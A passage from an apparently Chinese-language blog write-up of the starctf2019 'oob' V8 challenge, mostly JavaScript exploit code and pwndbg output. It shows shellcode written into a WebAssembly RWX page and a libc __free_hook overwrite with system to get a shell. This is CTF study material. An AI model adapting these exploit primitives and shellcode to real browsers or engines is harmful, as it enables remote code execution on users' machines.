class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">112</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">131</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">129</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">145</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">109</span>,<span class="number">97</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">138</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">65</span>,<span class="number">42</span>,<span class="number">11</span>]);</span><br><span class="line"><span class="keyword">var</span> wasmModule = <span class="keyword">new</span> WebAssembly.Module(wasmCode);</span><br><span class="line"><span class="keyword">var</span> wasmInstance = <span class="keyword">new</span> WebAssembly.Instance(wasmModule);</span><br><span class="line"><span class="keyword">var</span> f = wasmInstance.exports.main;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> f_addr = addressOf(f);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[*] leak wasm func addr: 0x&quot;</span> + hex(f_addr));</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> shared_info_addr = read64(f_addr + <span class="number">0x18n</span>) - <span class="number">0x1n</span>;</span><br><span class="line"><span class="keyword">var</span> wasm_exported_func_data_addr = read64(shared_info_addr + <span class="number">0x8n</span>) - <span class="number">0x1n</span>;</span><br><span class="line"><span class="keyword">var</span> wasm_instance_addr = read64(wasm_exported_func_data_addr + <span class="number">0x10n</span>) - <span class="number">0x1n</span>;</span><br><span class="line"><span class="keyword">var</span> rwx_page_addr = read64(wasm_instance_addr + <span class="number">0x88n</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[*] leak rwx_page_addr: 0x&quot;</span> + hex(rwx_page_addr));</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> data_buf = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x100</span>);</span><br><span class="line"><span class="keyword">var</span> data_view = <span class="keyword">new</span> <span class="built_in">DataView</span>(data_buf);</span><br><span class="line"><span class="keyword">var</span> buf_backing_store_addr = addressOf(data_buf) + <span class="number">0x20n</span>;</span><br><span class="line">write64(buf_backing_store_addr, rwx_page_addr);</span><br><span class="line"><span class="comment">//msfvenom -p linux/x64/exec CMD=whoami -f num</span></span><br><span class="line"><span class="keyword">var</span> shellcode1 = [<span class="number">0x6a</span>, <span class="number">0x3b</span>, <span class="number">0x58</span>, <span class="number">0x99</span>, <span class="number">0x48</span>, <span class="number">0xbb</span>, <span class="number">0x2f</span>, <span class="number">0x62</span>, <span class="number">0x69</span>, <span class="number">0x6e</span>, <span class="number">0x2f</span>, <span class="number">0x73</span>, <span class="number">0x68</span>, <span class="number">0x00</span>, <span class="number">0x53</span>,</span><br><span class="line"><span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xe7</span>, <span class="number">0x68</span>, <span class="number">0x2d</span>, <span class="number">0x63</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xe6</span>, <span class="number">0x52</span>, <span class="number">0xe8</span>, <span class="number">0x07</span>, <span class="number">0x00</span>,</span><br><span class="line"><span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x77</span>, <span class="number">0x68</span>, <span class="number">0x6f</span>, <span class="number">0x61</span>, <span class="number">0x6d</span>, <span class="number">0x69</span>, <span class="number">0x00</span>, <span class="number">0x56</span>, <span class="number">0x57</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xe6</span>, <span class="number">0x0f</span>,</span><br><span class="line"><span class="number">0x05</span>]</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; shellcode1.length; i++) &#123;</span><br><span class="line">    data_view.setUint8(i, shellcode1[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">f();</span><br></pre></td></tr></table></figure><h4 id="x86如下"><a href="#x86如下" class="headerlink" title="x86如下"></a>x86如下</h4><p>经过个人分析，x86的exp不可构造</p><p>X86构造的过程中，发现在调用oob的过程中，当执行如下语句时</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ××××××××2. addressOf和fakeObject的实现××××××××</span></span><br><span class="line"><span class="keyword">var</span> obj = &#123;<span class="string">&quot;a&quot;</span>: <span class="number">1</span>&#125;;</span><br><span class="line"><span class="keyword">var</span> obj_array = [obj];</span><br><span class="line"><span class="keyword">var</span> float_array = [<span class="number">1.1</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> obj_array_map = obj_array.oob();</span><br><span class="line"><span class="keyword">var</span> float_array_map = float_array.oob();</span><br></pre></td></tr></table></figure><p>泄露obj_array_map时发现泄露的是obj_array_map后面四个字节，内存如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">;obj对象</span><br><span class="line">pwndbg&gt; job 0x294083a1</span><br><span class="line">0x294083a1: [JSArray]</span><br><span class="line"> - map: 0x4ccc17bd &lt;Map(PACKED_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x47b48a75 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x29408395 &lt;FixedArray[1]&gt; [PACKED_ELEMENTS]</span><br><span class="line"> - length: 1</span><br><span class="line"> - properties: 0x260c0695 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #length: 0x28dc00d5 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x29408395 &lt;FixedArray[1]&gt; &#123;</span><br><span class="line">           0: 0x29408321 &lt;Object map = 0x4ccc55c5&gt;</span><br><span class="line"> &#125;</span><br><span class="line"> ; obj参数对象</span><br><span class="line">pwndbg&gt; job 0x29408395</span><br><span class="line">0x29408395: [FixedArray]</span><br><span class="line"> - map: 0x260c045d &lt;Map&gt;</span><br><span class="line"> - length: 1</span><br><span class="line">           0: 0x29408321 &lt;Object map = 0x4ccc55c5&gt;</span><br><span class="line">pwndbg&gt; telescope 0x29408394</span><br><span class="line">00:0000│  0x29408394 —▸ 0x260c045d ◂— 0x260c00; obj_elements_map</span><br><span class="line">01:0004│  0x29408398 ◂— 0x2  ; length = 1</span><br><span class="line">02:0008│  0x2940839c —▸ 0x29408321 ◂— 0x954ccc55; obj_elements_ptr</span><br><span class="line">03:000c│  0x294083a0 —▸ 0x4ccc17bd ◂— 0x4260c00; 要覆盖的map,也就是obj_map</span><br><span class="line">04:0010│  0x294083a4 —▸ 0x260c0695 ◂— 0x260c04; properties</span><br><span class="line">05:0014│  0x294083a8 —▸ 0x29408395 ◂— 0x2260c04; elements_obj</span><br><span class="line">06:0018│  0x294083ac ◂— 0x2</span><br><span class="line">07:001c│  0x294083b0 —▸ 0x260c0b29 ◂— 0x260c00</span><br></pre></td></tr></table></figure><p>而泄露的内存为<strong>00000000260c0695</strong>，为obj_array_map的后四个字节，而我们通过调试知道，x86里面变量所占用的存储空间也为8个字节，也就是说，我oob函数读写的时候，所操作的内存空间是8个字节，而起始位置，为<strong>0x294083a4</strong>，也就正好是越过obj_map，也就是四个字节进行读写。所以我们没有办法操作obj_array_map。</p><h2 id="8、传统堆利用方式exp构造"><a href="#8、传统堆利用方式exp构造" class="headerlink" title="8、传统堆利用方式exp构造"></a>8、传统堆利用方式exp构造</h2><h3 id="利用步骤"><a href="#利用步骤" class="headerlink" title="利用步骤"></a>利用步骤</h3><p>步骤如下：</p><p>1、泄露程序本身的地址空间</p><p>2、计算d8基址，读取GOT表中malloc等libc函数的内存地址，然后然后计算free_hook或system或one_gadget的地址，最后将system或one_gadget写入free_hook触发hook调用即可实现命令执行</p><p>3、调用free（实际上调用了/bin/sh），getshell</p><h3 id="泄露地址"><a href="#泄露地址" class="headerlink" title="泄露地址"></a>泄露地址</h3><p>可以通过以下顺序：</p><p>查看Array对象结构 –&gt; 查看对象的Map属性 –&gt; 查看Map中指定的constructor结构 –&gt; 查看code属性 –&gt;在code内存地址的固定偏移处存储了v8二进制的指令地址</p><p>debug日志如下</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; job <span class="number">0x27b381f0f8c9</span></span><br><span class="line"><span class="number">0x27b381f0f8c9</span>: [JSArray]</span><br><span class="line"> - map: <span class="number">0x1ff245482ed9</span> &lt;<span class="built_in">Map</span>(PACKED_DOUBLE_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: <span class="number">0x25166f051111</span> &lt;JSArray[<span class="number">0</span>]&gt;</span><br><span class="line"> - elements: <span class="number">0x27b381f0f8b1</span> &lt;FixedDoubleArray[<span class="number">1</span>]&gt; [PACKED_DOUBLE_ELEMENTS]</span><br><span class="line"> - length: <span class="number">1</span></span><br><span class="line"> - properties: <span class="number">0x0de30b5c0c71</span> &lt;FixedArray[<span class="number">0</span>]&gt; &#123;</span><br><span class="line">    <span class="meta">#length: 0x2009df4801a9 <span class="meta-string">&lt;AccessorInfo&gt;</span> (const accessor descriptor)</span></span><br><span class="line"> &#125;</span><br><span class="line"> - elements: <span class="number">0x27b381f0f8b1</span> &lt;FixedDoubleArray[<span class="number">1</span>]&gt; &#123;</span><br><span class="line">           <span class="number">0</span>: <span class="number">1.1</span></span><br><span class="line"> &#125;</span><br><span class="line">pwndbg&gt; job <span class="number">0x1ff245482ed9</span></span><br><span class="line"><span class="number">0x1ff245482ed9</span>: [Map]</span><br><span class="line"> - type: JS_ARRAY_TYPE</span><br><span class="line"> - instance size: <span class="number">32</span></span><br><span class="line"> - inobject properties: <span class="number">0</span></span><br><span class="line"> - elements kind: PACKED_DOUBLE_ELEMENTS</span><br><span class="line"> - unused property fields: <span class="number">0</span></span><br><span class="line"> - <span class="class"><span class="keyword">enum</span> <span class="title">length</span>:</span> invalid</span><br><span class="line"> - back pointer: <span class="number">0x1ff245482e89</span> &lt;<span class="built_in">Map</span>(HOLEY_SMI_ELEMENTS)&gt;</span><br><span class="line"> - prototype_validity cell: <span class="number">0x2009df480609</span> &lt;Cell value= <span class="number">1</span>&gt;</span><br><span class="line"> - instance descriptors #<span class="number">1</span>: <span class="number">0x25166f051f49</span> &lt;DescriptorArray[<span class="number">1</span>]&gt;</span><br><span class="line"> - layout descriptor: (nil)</span><br><span class="line"> - transitions #<span class="number">1</span>: <span class="number">0x25166f051eb9</span> &lt;TransitionArray[<span class="number">4</span>]&gt;Transition array #<span class="number">1</span>:</span><br><span class="line">     <span class="number">0x0de30b5c4ba1</span> &lt;Symbol: (elements_transition_symbol)&gt;: (transition to HOLEY_DOUBLE_ELEMENTS) -&gt; <span class="number">0x1ff245482f29</span> &lt;<span class="built_in">Map</span>(HOLEY_DOUBLE_ELEMENTS)&gt;</span><br><span class="line"></span><br><span class="line"> - prototype: <span class="number">0x25166f051111</span> &lt;JSArray[<span class="number">0</span>]&gt;</span><br><span class="line"> - constructor: <span class="number">0x25166f050ec1</span> &lt;JSFunction <span class="built_in">Array</span> (sfi = <span class="number">0x2009df486791</span>)&gt;</span><br><span class="line"> - dependent code: <span class="number">0x0de30b5c02c1</span> &lt;Other heap <span class="built_in">object</span> (WEAK_FIXED_ARRAY_TYPE)&gt;</span><br><span class="line"> - construction counter: <span class="number">0</span></span><br><span class="line">pwndbg&gt; job <span class="number">0x25166f050ec1</span></span><br><span class="line"><span class="number">0x25166f050ec1</span>: [Function] in OldSpace</span><br><span class="line"> - map: <span class="number">0x1ff245482d49</span> &lt;<span class="built_in">Map</span>(HOLEY_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: <span class="number">0x25166f042109</span> &lt;<span class="built_in">JSFunction</span> (sfi = <span class="number">0x2009df483b29</span>)&gt;</span><br><span class="line"> - elements: <span class="number">0x0de30b5c0c71</span> &lt;FixedArray[<span class="number">0</span>]&gt; [HOLEY_ELEMENTS]</span><br><span class="line"> - function prototype: <span class="number">0x25166f051111</span> &lt;JSArray[<span class="number">0</span>]&gt;</span><br><span class="line"> - initial_map: <span class="number">0x1ff245482d99</span> &lt;<span class="built_in">Map</span>(PACKED_SMI_ELEMENTS)&gt;</span><br><span class="line"> - shared_info: <span class="number">0x2009df486791</span> &lt;SharedFunctionInfo Array&gt;</span><br><span class="line"> - name: <span class="number">0x0de30b5c3599</span> &lt;String[#<span class="number">5</span>]: Array&gt;</span><br><span class="line"> - builtin: ArrayConstructor</span><br><span class="line"> - formal_parameter_count: <span class="number">65535</span></span><br><span class="line"> - kind: NormalFunction</span><br><span class="line"> - context: <span class="number">0x25166f041869</span> &lt;NativeContext[<span class="number">246</span>]&gt;</span><br><span class="line"> - code: <span class="number">0x1e6620dc6981</span> &lt;Code BUILTIN ArrayConstructor&gt;</span><br><span class="line"> - properties: <span class="number">0x25166f051029</span> &lt;PropertyArray[<span class="number">6</span>]&gt; &#123;</span><br><span class="line">    <span class="meta">#length: 0x2009df4804b9 <span class="meta-string">&lt;AccessorInfo&gt;</span> (const accessor descriptor)</span></span><br><span class="line">    <span class="meta">#name: 0x2009df480449 <span class="meta-string">&lt;AccessorInfo&gt;</span> (const accessor descriptor)</span></span><br><span class="line">    <span class="meta">#prototype: 0x2009df480529 <span class="meta-string">&lt;AccessorInfo&gt;</span> (const accessor descriptor)</span></span><br><span class="line">    <span class="number">0x0de30b5c4c79</span> &lt;Symbol: (native_context_index_symbol)&gt;: <span class="number">11</span> (<span class="keyword">const</span> data field <span class="number">0</span>) properties[<span class="number">0</span>]</span><br><span class="line">    <span class="number">0x0de30b5c4f41</span> &lt;Symbol: Symbol.species&gt;: <span class="number">0x25166f050fd9</span> &lt;AccessorPair&gt; (<span class="keyword">const</span> accessor descriptor)</span><br><span class="line">    #isArray: <span class="number">0x25166f051069</span> &lt;JSFunction <span class="built_in">isArray</span> (sfi = <span class="number">0x2009df486829</span>)&gt; (<span class="keyword">const</span> data field <span class="number">1</span>) properties[<span class="number">1</span>]</span><br><span class="line">    <span class="meta">#from: 0x25166f0510a1 <span class="meta-string">&lt;JSFunction from (sfi = 0x2009df486879)&gt;</span> (const data field 2) properties[2]</span></span><br><span class="line">    <span class="meta">#of: 0x25166f0510d9 <span class="meta-string">&lt;JSFunction of (sfi = 0x2009df4868b1)&gt;</span> (const data field 3) properties[3]</span></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> - feedback vector: <span class="keyword">not</span> available</span><br><span class="line">pwndbg&gt; job <span class="number">0x1e6620dc6981</span></span><br><span class="line"><span class="number">0x1e6620dc6981</span>: [Code]</span><br><span class="line"> - map: <span class="number">0x0de30b5c0a31</span> &lt;Map&gt;</span><br><span class="line">kind = BUILTIN</span><br><span class="line">name = ArrayConstructor</span><br><span class="line">compiler = turbofan</span><br><span class="line">address = <span class="number">0x7ffc86ea2078</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Trampoline</span> (size = <span class="number">13</span>)</span><br><span class="line"><span class="number">0x1e6620dc69c0</span>     <span class="number">0</span>  <span class="number">49b</span>a8087519805560000 REX.W movq r10,<span class="number">0x560598518780</span>  (ArrayConstructor)</span><br><span class="line"><span class="number">0x1e6620dc69ca</span>     a  <span class="number">41f</span>fe2         jmp r10</span><br><span class="line"></span><br><span class="line"><span class="built_in">Instructions</span> (size = <span class="number">28</span>)</span><br><span class="line"><span class="number">0x560598518780</span>     <span class="number">0</span>  <span class="number">493955</span>d8       REX.W cmpq [r13<span class="number">-0x28</span>] (<span class="built_in">root</span> (undefined_value)),rdx</span><br><span class="line"><span class="number">0x560598518784</span>     <span class="number">4</span>  <span class="number">7405</span>           jz <span class="number">0x56059851878b</span>  (ArrayConstructor)</span><br><span class="line"><span class="number">0x560598518786</span>     <span class="number">6</span>  <span class="number">488b</span>ca         REX.W movq rcx,rdx</span><br><span class="line"><span class="number">0x560598518789</span>     <span class="number">9</span>  eb03           jmp <span class="number">0x56059851878e</span>  (ArrayConstructor)</span><br><span class="line"><span class="number">0x56059851878b</span>     b  <span class="number">488b</span>cf         REX.W movq rcx,rdi</span><br><span class="line"><span class="number">0x56059851878e</span>     e  <span class="number">498b</span>5dd8       REX.W movq rbx,[r13<span class="number">-0x28</span>] (<span class="built_in">root</span> (undefined_value))</span><br><span class="line"><span class="number">0x560598518792</span>    <span class="number">12</span>  <span class="number">488b</span>d1         REX.W movq rdx,rcx</span><br><span class="line"><span class="number">0x560598518795</span>    <span class="number">15</span>  e926000000     jmp <span class="number">0x5605985187c0</span>  (ArrayConstructorImpl)</span><br><span class="line"><span class="number">0x56059851879a</span>    <span class="number">1</span>a  <span class="number">90</span>             nop</span><br><span class="line"><span class="number">0x56059851879b</span>    <span class="number">1b</span>  <span class="number">90</span>             nop</span><br><span class="line"></span><br><span class="line"><span class="built_in">Safepoints</span> (size = <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">RelocInfo</span> (size = <span class="number">2</span>)</span><br><span class="line"><span class="number">0x1e6620dc69c2</span>  off heap target</span><br><span class="line"></span><br><span class="line">pwndbg&gt; telescope <span class="number">0x1e6620dc6980</span> <span class="number">20</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│   <span class="number">0x1e6620dc6980</span> —▸ <span class="number">0xde30b5c0a31</span> ◂— <span class="number">0xde30b5c01</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│   <span class="number">0x1e6620dc6988</span> —▸ <span class="number">0xde30b5c2c01</span> ◂— <span class="number">0xde30b5c07</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│   <span class="number">0x1e6620dc6990</span> —▸ <span class="number">0xde30b5c0c71</span> ◂— <span class="number">0xde30b5c08</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│   <span class="number">0x1e6620dc6998</span> —▸ <span class="number">0xde30b5c2791</span> ◂— <span class="number">0xde30b5c07</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│   <span class="number">0x1e6620dc69a0</span> —▸ <span class="number">0x2009df4916a9</span> ◂— <span class="number">0xd100000de30b5c14</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│   <span class="number">0x1e6620dc69a8</span> ◂— <span class="keyword">or</span>     eax, <span class="number">0xc6000000</span> <span class="comment">/* &#x27;\r&#x27; */</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│   <span class="number">0x1e6620dc69b0</span> ◂— sbb    al, <span class="number">0</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│   <span class="number">0x1e6620dc69b8</span> ◂— <span class="keyword">and</span>    al, <span class="number">0</span> <span class="comment">/* &#x27;$&#x27; */</span></span><br><span class="line"><span class="number">08</span>:<span class="number">0040</span>│   <span class="number">0x1e6620dc69c0</span> ◂— movabs r10, <span class="number">0x560598518780</span></span><br><span class="line"><span class="number">09</span>:<span class="number">0048</span>│   <span class="number">0x1e6620dc69c8</span> ◂— add    byte ptr [rax], al</span><br><span class="line"><span class="number">0</span>a:<span class="number">0050</span>│   <span class="number">0x1e6620dc69d0</span> ◂— add    byte ptr [rax], al</span><br><span class="line">... ↓</span><br><span class="line"><span class="number">0</span>c:<span class="number">0060</span>│   <span class="number">0x1e6620dc69e0</span> —▸ <span class="number">0xde30b5c0a31</span> ◂— <span class="number">0xde30b5c01</span></span><br><span class="line"><span class="number">0</span>d:<span class="number">0068</span>│   <span class="number">0x1e6620dc69e8</span> —▸ <span class="number">0xde30b5c2c01</span> ◂— <span class="number">0xde30b5c07</span></span><br><span class="line"><span class="number">0</span>e:<span class="number">0070</span>│   <span class="number">0x1e6620dc69f0</span> —▸ <span class="number">0xde30b5c0c71</span> ◂— <span class="number">0xde30b5c08</span></span><br><span class="line"><span class="number">0f</span>:<span class="number">0078</span>│   <span class="number">0x1e6620dc69f8</span> —▸ <span class="number">0xde30b5c2791</span> ◂— <span class="number">0xde30b5c07</span></span><br><span class="line"><span class="number">10</span>:<span class="number">0080</span>│   <span class="number">0x1e6620dc6a00</span> —▸ <span class="number">0x2009df4916c1</span> ◂— <span class="number">0xd100000de30b5c14</span></span><br><span class="line"><span class="number">11</span>:<span class="number">0088</span>│   <span class="number">0x1e6620dc6a08</span> ◂— <span class="keyword">or</span>     eax, <span class="number">0xc6000000</span> <span class="comment">/* &#x27;\r&#x27; */</span></span><br><span class="line"><span class="number">12</span>:<span class="number">0090</span>│   <span class="number">0x1e6620dc6a10</span> ◂— mov    byte ptr [rcx], al</span><br><span class="line"><span class="number">13</span>:<span class="number">0098</span>│   <span class="number">0x1e6620dc6a18</span> ◂— lahf</span><br><span class="line"></span><br><span class="line"><span class="comment">//在偏移0x40的位置取到程序地址空间地址</span></span><br><span class="line">pwndbg&gt; vmmap <span class="number">0x560598518780</span></span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">    <span class="number">0x560597bc9000</span>     <span class="number">0x5605987a1000</span> r-xp   bd8000 <span class="number">679000</span> /root/browser_study/v8/v8/v8/out/x64.release/d8 +<span class="number">0x94f780</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>编写泄露地址空间地址代码如下</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>];</span><br><span class="line">%DebugPrint(a);</span><br><span class="line"><span class="keyword">var</span> code_addr = read64(addressOf(a.constructor) + <span class="number">0x30n</span>);</span><br><span class="line"><span class="keyword">var</span> leak_d8_addr = read64(code_addr + <span class="number">0x41n</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[*] find libc leak_d8_addr: 0x&quot;</span> + hex(leak_d8_addr));</span><br><span class="line">%SystemBreak();</span><br></pre></td></tr></table></figure><p>gdb执行如下</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; r</span><br><span class="line">Starting program: /root/browser_study/v8/v8/v8/out/x64.release/d8 --allow-natives-syntax ./poc1.js</span><br><span class="line">...</span><br><span class="line"><span class="number">0x2583cc70fa41</span> &lt;JSArray[<span class="number">3</span>]&gt;</span><br><span class="line">[*] leak from: <span class="number">0x000013eba5410ef0</span>: <span class="number">0x000015e8b1dc6981</span></span><br><span class="line">[*] leak from: <span class="number">0x000015e8b1dc69c2</span>: <span class="number">0x00005626808ca780</span></span><br><span class="line">[*] find libc leak_d8_addr: <span class="number">0x00005626808ca780</span></span><br><span class="line"></span><br><span class="line">pwndbg&gt; vmmap <span class="number">0x00005626808ca780</span></span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">    <span class="number">0x56267ff7b000</span>     <span class="number">0x562680b53000</span> r-xp   bd8000 <span class="number">679000</span> /root/browser_study/v8/v8/v8/out/x64.release/d8 +<span class="number">0x94f780</span></span><br></pre></td></tr></table></figure><h3 id="计算程序基址以及got表各函数地址"><a href="#计算程序基址以及got表各函数地址" class="headerlink" title="计算程序基址以及got表各函数地址"></a>计算程序基址以及got表各函数地址</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> d8_base_addr = leak_d8_addr -<span class="number">0xfc8780</span>;</span><br><span class="line"><span class="keyword">var</span> d8_got_libc_start_main_addr = d8_base_addr + <span class="number">0x12a47b0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> libc_start_main_addr = read64(d8_got_libc_start_main_addr);</span><br><span class="line"><span class="keyword">var</span> libc_base_addr = libc_start_main_addr - <span class="number">0x26fc0n</span>;</span><br><span class="line"><span class="keyword">var</span> libc_system_addr = libc_base_addr + <span class="number">0x55410</span>;</span><br><span class="line"><span class="keyword">var</span> libc_free_hook_addr = libc_base_addr + <span class="number">0x1eeb28</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[*] find libc libc_free_hook_addr: 0x&quot;</span> + hex(libc_free_hook_addr)); </span><br><span class="line">%SystemBreak();</span><br><span class="line"></span><br><span class="line">write64(libc_free_hook_addr, libc_system_addr); </span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[*] Write ok.&quot;</span>);</span><br><span class="line">%SystemBreak();</span><br></pre></td></tr></table></figure><p>下面逐个进行讲解</p><h4 id="获取d8-base-addr"><a href="#获取d8-base-addr" class="headerlink" title="获取d8_base_addr"></a>获取d8_base_addr</h4><p>通过下面两张图，可以看到我们泄露的地址为0x0000559f4ba96780，而应用程序的基地址为0x559f4aace000，这样他们的差值就为0xfc8780</p><p><img src="/2021/04/21/starctf2019-oob/image-20210104201643280.png" alt="image-20210104201643280"></p><p><img src="/2021/04/21/starctf2019-oob/image-20210104201717162.png" alt="image-20210104201717162"></p><h4 id="获取d8-got-libc-start-main-addr"><a 